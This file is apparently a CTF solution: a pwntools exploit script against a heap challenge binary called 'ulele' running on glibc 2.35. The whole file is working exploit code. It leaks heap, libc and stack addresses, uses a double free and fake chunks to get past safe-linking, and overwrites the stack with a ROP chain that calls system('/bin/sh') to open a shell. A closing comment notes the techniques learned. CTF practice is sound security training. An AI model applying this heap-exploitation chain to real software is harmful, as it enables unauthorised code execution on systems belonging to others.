from pwn import *
# context.log_level   ='debug'
context.arch        ='amd64'
'''
Libc Lib:
    https://libc.rip/
'''
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=process('./ulele')#,env={"LD_PRELOAD":"/glibc/x64/2.35/lib/libc.so.6"})
# p = remote("ulele.chal.crewc.tf",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

# libc = ELF("../libc.so.6")
def cmd(c):
    sla(b'>> ',str(c).encode())
def add(c='nop'):
    cmd(1)
    sa(": ",c)
def show(idx):
    cmd(2)
    sla(": ",str(idx).encode())
def free(idx):
    cmd(3)
    sla(": ",str(idx).encode())

def leak(a,x=0,mute=0):
    ru(a)
    if x: # when to stop
        leaked = int(ru(x)[:-1],16)
    else:
        leaked = u64(p.read(6)+b'\0\0')
    if mute==0:
        warn(hex(leaked))
    return leaked


for x in range(0x240):
    add()
free(0x100)
show(0x0)
ru(b': ')
heap = u64(ru(b'\n')[:-1].ljust(0x8,b'\0'))<<12
warn(hex(heap))

for x in range(0xdf-20+21):
    add()

add(p64(0xdeadbeef)*9+flat([0x71,0x555555589-0x55555556c+(heap>>12),0])) # fakechunk to oob-write slot renew
for x in range(0x9):
    free(0x101+x)
for x in range(7):
    add()
free(0x101+8)
add(p64((heap>>12)^(0x5555555899c0-0x55555556c000+heap)))
add()
add(b'\0'*0x18+flat([0x3211,0x5555555899f0+8-0x55555556c000+heap,0x55555557add8-0x55555556c000+heap,0x5555555899f0+8-0x55555556c000+heap+0x10,0x5555555899d0-0x55555556c000+heap]))
show(0)
base = leak("Data: ")-0x1f2ce0-(0x7ffff7828000-0x7ffff7800000)
warn(hex(base))
free(2)
add(b'\0'*0x18+flat([0x3211,0x5555555899f0+8-0x55555556c000+heap,0x222200+base,0x5555555899f0+8-0x55555556c000+heap+0x10,0x5555555899d0-0x55555556c000+heap+0x10]))
show(0)
stack = leak("Data: ")



for x in range(8):
    free(0x120+x)
for x in range(7):
    add()
free(0x199)
free(0x19a)
free(0x127)
add(p64(((heap>>12)+1)^(0x555555571b60-0x55555556c000+heap)))
add("TBF") # 19a 0x555555571bc0
mask = (heap>>12)+( 0x555555571- 0x55555556c)
add(flat([1,2,3,4,5,6,0,0x71,mask ^ (0x555555571b70-0x55555556c000+heap),0x71,mask]))

add()
free(0x199)

add(flat([1,2,3,4,5,6,7,8,0,0x71,((heap>>12)+( 0x555555571- 0x55555556c)) ^ (stack-(0x7fffffffdbf8-0x7fffffffda78+0x8))]))
add()

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = base
rop     = ROP(libc)
rdi     = rop.find_gadget(['pop rdi','ret'])[0]
ret     = rdi+1
sh_str  = libc.search(b"/bin/sh\0").__next__()
system  = libc.sym['system']
chain   = [ret]+[rdi,sh_str,system]
add(flat([1]+chain))

# gdb.attach(p)
p.interactive()


"""
Things I learned from this challenge
1. How to do double-free on glibc-2.35
2. How to create overlap and fake-chunk-link with double-free ont glibc-2.35
"""